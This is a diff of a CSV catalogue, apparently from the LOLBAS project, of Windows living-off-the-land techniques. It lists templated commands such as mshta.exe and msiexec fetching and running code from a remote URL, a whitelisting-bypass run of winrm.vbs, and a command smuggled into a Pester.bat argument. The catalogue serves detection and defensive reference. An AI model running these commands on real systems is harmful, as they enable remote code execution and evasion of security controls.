@@ -139,7 +139,6 @@ Mshta.exe,"mshta.exe vbscript:Close(Execute(""GetObject(""""script:{REMOTEURL:.s
 Mshta.exe,"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",Execute,C:\Windows\System32\mshta.exe,https://lolbas-project.github.io/lolbas/Binaries/Mshta/,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",mshta.exe javascript:a GetObject script: .Exec ;close ;
 Mshta.exe,"mshta.exe ""{PATH_ABSOLUTE}:file.hta""",ADS,C:\Windows\System32\mshta.exe,https://lolbas-project.github.io/lolbas/Binaries/Mshta/,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)",mshta.exe
 Mshta.exe,mshta.exe {REMOTEURL},Download,C:\Windows\System32\mshta.exe,https://lolbas-project.github.io/lolbas/Binaries/Mshta/,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",mshta.exe
-Msiexec.exe,msiexec /quiet /i {PATH:.msi},Execute,C:\Windows\System32\msiexec.exe,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",msiexec /quiet /i
 Msiexec.exe,msiexec /q /i {REMOTEURL},Execute,C:\Windows\System32\msiexec.exe,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",msiexec /q /i
 Msiexec.exe,msiexec /y {PATH_ABSOLUTE:.dll},Execute,C:\Windows\System32\msiexec.exe,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",msiexec /y
 Msiexec.exe,msiexec /z {PATH_ABSOLUTE:.dll},Execute,C:\Windows\System32\msiexec.exe,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",msiexec /z
@@ -448,4 +447,5 @@ winrm.vbs,"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayNam
 winrm.vbs,%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,AWL Bypass,C:\Windows\System32\winrm.vbs,https://lolbas-project.github.io/lolbas/Scripts/Winrm/,"Windows 10, Windows 11",%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
 Pester.bat,"Pester.bat [/help|?|-?|/?] ""$null; {CMD}""",Execute,c:\Program Files\WindowsPowerShell\Modules\Pester\<VERSION>\bin\Pester.bat,https://lolbas-project.github.io/lolbas/Scripts/pester/,"Windows 10, Windows 11",Pester.bat [ / help ? - ? / ? ] $null;
 Pester.bat,Pester.bat ;{PATH:.exe},Execute,c:\Program Files\WindowsPowerShell\Modules\Pester\<VERSION>\bin\Pester.bat,https://lolbas-project.github.io/lolbas/Scripts/pester/,"Windows 10, Windows 11",Pester.bat ;
+
 
